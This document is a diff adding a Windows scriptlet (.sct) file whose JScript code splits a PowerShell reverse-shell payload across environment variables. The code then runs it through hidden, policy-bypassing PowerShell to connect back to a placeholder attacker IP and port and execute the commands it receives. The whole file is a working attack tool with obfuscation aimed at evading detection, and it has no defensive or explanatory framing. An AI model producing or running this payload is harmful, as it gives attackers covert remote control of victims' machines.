@@ -1,0 +1,21 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="SplitPersist" classid="{20002000-2000-2000-2000-200020002000}" >
+    <script language="JScript">
+        <![CDATA[
+            var shell = new ActiveXObject("WScript.Shell");
+            var env = shell.Environment("Process");
+
+            env("p1") = "$c=New-Object System.Net.Sockets.TCPClient(";
+            env("p2") = "'<YOUR IP>',<PORT>);$s=$c.GetStream();";
+            env("p3") = "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){";
+            env("p4") = "$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);";
+            env("p5") = "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$s.Write(([Text.Encoding]::UTF8).GetBytes($sb2),0,$sb2.Length);$s.Flush()};$c.Close()";
+
+            var cmd = "powershell -ep bypass -W Hidden -nop -c IEX($env:p1+$env:p2+$env:p3+$env:p4+$env:p5)";
+            
+            shell.Run(cmd, 0);
+        ]]>
+    </script>
+</registration>
+</scriptlet>
